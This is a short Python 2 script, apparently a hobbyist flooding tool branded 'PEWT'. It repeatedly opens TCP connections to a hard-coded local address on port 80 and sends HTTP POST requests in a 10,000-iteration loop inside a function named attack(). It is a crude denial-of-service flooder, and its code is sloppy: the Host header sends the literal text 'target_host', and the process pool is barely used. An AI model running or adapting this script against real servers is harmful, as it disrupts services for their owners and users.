import socket
import sys
import multiprocessing
import concurrent
import threading

print "<<<<<<<WELCOME TO PEWT>>>>>>>"

target_host  = "192.168.1.65"
target_port  = 80
count        = 10

print "<<<<<<<<WORKING ON IT>>>>>>>"
print "   <<<<<<<HOLD ON >>>>>>"
# socket object

from concurrent.futures._base import (FIRST_COMPLETED,
                                      FIRST_EXCEPTION,
                                      ALL_COMPLETED,
                                      CancelledError,
                                      TimeoutError,
                                      Future,
                                      Executor,
                                      wait,
                                      as_completed)
from concurrent.futures.thread import ThreadPoolExecutor

try:
    from concurrent.futures.process import ProcessPoolExecutor
except ImportError:
    # some platforms don't have multiprocessing
    pass

def attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client.connect((target_host,target_port))

    client.send("POST / HTTP/1.1\r\nHost: target_host\r\n\r\n")

    response = client.recv(4096)
    
executor = concurrent.futures.ProcessPoolExecutor(10)
futures  = [executor.submit(attack)]

for count in range(1, 10000):
    attack()    


print ">>>>>>DONE<<<<<<"
print ">>YOUR WELCOME<<"

